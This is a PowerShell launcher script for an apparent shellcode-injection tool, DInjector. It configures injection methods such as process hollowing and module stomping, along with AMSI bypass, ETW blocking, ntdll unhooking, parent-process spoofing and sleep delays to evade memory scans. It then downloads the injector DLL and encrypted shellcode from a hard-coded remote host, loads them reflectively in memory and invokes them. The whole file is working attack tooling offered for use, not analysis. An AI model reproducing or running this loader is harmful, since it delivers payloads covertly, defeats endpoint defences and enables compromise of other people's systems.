<#
.DESCRIPTION

Module name. Choose from:
  
  "functionpointer",
  "functionpointerunsafe",
  "timeformats",
  "clipboardpointer",
  "currentthread",
  "currentthreaduuid",
  "remotethread",
  "remotethreaddll",
  "remotethreadview",
  "remotethreadsuspended",
  "remotethreadkernelcb",
  "remotethreadapc",
  "remotethreadcontext",
  "processhollowing",
  "modulestomping"
#>
$A = "currentthread"

# [/sc] lhost
$B = "10.10.13.37"

# [/sc] lport
$C = 80

# injector filename
$D = "DInjector.dll"

# [/sc] encrypted shellcode filename
$E = "enc"

# [/p] password to decrypt the shellcode
$F = "Passw0rd!"

# [/protect] protection value that will be applied to the memory region where the shellcode resides ("RX" / "RWX", used in "currentthread")
$G = "RX"

# [/flipSleep] timeout for NtDelayExecution (ms) to delay execution with PAGE_NOACCESS on the shellcode memory region before resuming the thread (0 is disable memory protection flip, used in "currentthread" and "remotethreadsuspended")
$H = 0

# [/timeout] timeout for NtWaitForSingleObject (ms) to wait before doing extra cleanup (0 is serve forever, used in "currentthread")
$I = 0

# [/fluctuate] protection value to fluctuate with that will be applied to the memory region where the shellcode resides; this option also activates memory obfuscation ("RW", used in "currentthread")
$J = 0

# [/spoofStack] enable current thread stack frame spoofing to hide the presence of the shellcode ("True" / "False", used in "currentthread" when /fluctuate is not 0)
$K = "False"

# [/image] path to the image of a newly spawned process to inject into (used in "remotethreadkernelcb", "remotethreadapc", "remotethreadcontext", "processhollowing" and "modulestomping")
# if there're spaces in the image path, replace them with asterisk (*) characters (e.g., C:\Program Files\Mozilla Firefox\firefox.exe -> C:\Program*Files\Mozilla*Firefox\firefox.exe)
$L = "C:\Windows\System32\svchost.exe"

# existing process name to inject into (used in "remotethread", "remotethreaddll", "remotethreadview", "remotethreadsuspended")
$M = "notepad"

# parent process name to spoof the original value (use "0" to disable PPID spoofing, used in "remotethreadkernelcb", "remotethreadapc", "remotethreadcontext", "processhollowing" and "modulestomping")
$N = "explorer"

# [/dll] loaded module (DLL) name to overwrite its .text section for storing the shellcode (used in "remotethreaddll")
$O = "msvcp_win.dll"

# [/stompDll] name of the module (DLL) to stomp (used in "modulestomping")
$P = "xpsservices.dll"

# [/stompExport] exported function name to overwrite (used in "modulestomping")
$Q = "DllCanUnloadNow"

# [/sleep] number of seconds (approx.) to sleep before execution to evade potential in-memory scan (10s-60s)
$R = 0

# [/blockDlls] block 3rd-party DLLs ("True" / "False", used in "remotethreadkernelcb", "remotethreadapc", "remotethreadcontext", "processhollowing" and "modulestomping")
$S = "True"

# [/am51] bypass AMSI for current process ("True" / "False" / "Force")
$T = "True"

# [/remoteAm51] bypass AMSI for remote process ("True" / "False" / "Force", used in "remotethreadkernelcb", "remotethreadapc", "remotethreadcontext", "processhollowing" and "modulestomping", "remotethreadkernelcb", "remotethreadapc", "remotethreadcontext", "processhollowing" and "modulestomping")
$U = "True"

# [/etw] block ETW ("True" / "False", used in all techniques)
$V = "False"

# [/unhook] unhook ntdll.dll ("True" / "False", all techniques)
$W = "False"

# [/debug] print debug messages ("True" / "False", all techniques)
$X = "False"

# --------------------------------------------------------------------

$methods = @("remotethread", "remotethreaddll", "remotethreadview", "remotethreadsuspended")
if ($methods.Contains($A)) {
    $M = (Start-Process -WindowStyle Hidden -PassThru $M).Id
}

$methods = @("remotethreadkernelcb", "remotethreadapc", "remotethreadcontext", "processhollowing", "modulestomping")
if ($methods.Contains($A)) {
    try {
        $N = (Get-Process $N -ErrorAction Stop).Id
        # if multiple processes exist with the same name, arbitrary select the first one
        if ($N -is [array]) {
            $N = $N[0]
        }
    }
    catch {
        $N = 0
    }
}

$cmd = "${A} /sc:http://${B}:${C}/${E} /p:${F} /protect:${G} /flipSleep:${H} /timeout:${I} /fluctuate:${J} /spoofStack:${K} /image:${L} /pid:${M} /ppid:${N} /dll:${O} /stompDll:${P} /stompExport:${Q} /sleep:${R} /blockDlls:${S} /am51:${T} /remoteAm51:${U} /etw:${V} /unhook:${W} /debug:${X}"

$data = (IWR -UseBasicParsing "http://${B}:${C}/${D}").Content
$assem = [System.Reflection.Assembly]::Load($data)

$flags = [Reflection.BindingFlags] "Public,NonPublic,Static"

$class = $assem.GetType("DInjector.Detonator", $flags)
$entry = $class.GetMethod("Boom", $flags)

$entry.Invoke($null, (, $cmd))
